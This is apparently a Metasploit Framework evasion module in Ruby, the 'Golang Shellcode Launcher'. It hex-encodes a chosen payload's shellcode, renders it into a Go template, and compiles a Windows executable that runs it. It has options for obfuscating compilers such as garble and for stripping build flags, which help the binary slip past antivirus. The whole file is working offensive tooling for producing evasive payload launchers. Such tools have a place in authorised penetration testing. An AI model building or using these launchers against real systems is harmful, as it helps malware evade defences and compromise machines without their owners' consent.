##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/compiler/golang'
require 'erb'

class MetasploitModule < Msf::Evasion

  include ::ActionView::Helpers::NumberHelper

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Golang Shellcode Launcher',
        'Description' => %q{
          Execute a provided payload from Go
        },
        'Author' => [ 'audibleblink' ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'Targets' => [ ['Microsoft Windows', {}] ],
        'Dependencies' => [
          Metasploit::Framework::Compiler::Golang,
        ]
      )
    )

    register_options([
      OptPath.new(
        'PATH', [ true, 'Output directory', Msf::Config.local_directory ]
      ),
      OptBool.new(
        'DEBUGGING', [ true, 'Enable Debugging on the resulting binary', false ]
      ),
    ], self.class)

    register_advanced_options([
      OptString.new(
        'LDFLAGS', [ false, 'ldflags to pass the builder, space-separated Ex: -s -w' ]
      ),
      OptString.new(
        'COMPILER', [ true, 'Set a custom builder like garble, if you have it installed', 'go' ]
      ),
      OptString.new(
        'COMPILER_FLAGS', [ false, 'CSV flags to pass the compiler, ex: "garble -literals"' ]
      ),
      OptString.new(
        'BUILD_FLAGS', [ false, 'CSV flags to pass the compiler\'s build subcommand "". ex: go build -a -u -trimpath', '' ]
      ),
      OptBool.new(
        'KEEPSRC', [ false, 'Save the generated source code to output directory', false ]
      ),
    ], self.class)
  end

  TEMPLATE_DIR = File.join(Msf::Config.data_directory, 'evasion', 'windows', 'golang_shellcode_exec')
  ARCH_MAP = {ARCH_X86 => '386', ARCH_X64 => 'amd64'}

  def run
    opts = {
      env: { 'GOOS' => 'windows', 'GOARCH' => ARCH_MAP[payload.arch.first] },
      compiler: datastore['COMPILER'],
      compiler_flags: datastore['COMPILER_FLAGS'],
      outfile: File.join(datastore['PATH'], datastore['FILENAME']),
      build_flags: datastore['BUILD_FLAGS'],
      ldflags: datastore['LDFLAGS'],
      keep_src: datastore['KEEPSRC']
    }

    shellcode = Rex::Text.to_hex(payload.encoded, '')
    debug = datastore['DEBUGGING']
    tmpl_path = File.join(TEMPLATE_DIR, 'go_shellcode.erb')
    template = File.read(tmpl_path)
    source = ERB.new(template).result(binding)

    vprint_status('Compiling with the following options')
    opts.each { |k, v| vprint_status("#{k}: #{v}") }

    compiler = Metasploit::Framework::Compiler::Golang.new(**opts)
    vprint_status('Running: ' + compiler.cmd_build.join(' '))
    src, err = compiler.go_build_src(source)
    if err == ''
      print_good('Success!')
      print_good("Payload: #{opts[:outfile]}")
      print_good("Source: #{src}") if opts[:keep_src]

      vprint_status("Shellcode size: #{number_to_human_size(payload.encoded.size)}")
      vprint_status("Total size : #{number_to_human_size(File.size(opts[:outfile]))}")
    else
      print_warning("Compiler returned: #{err}")
    end
  end
end
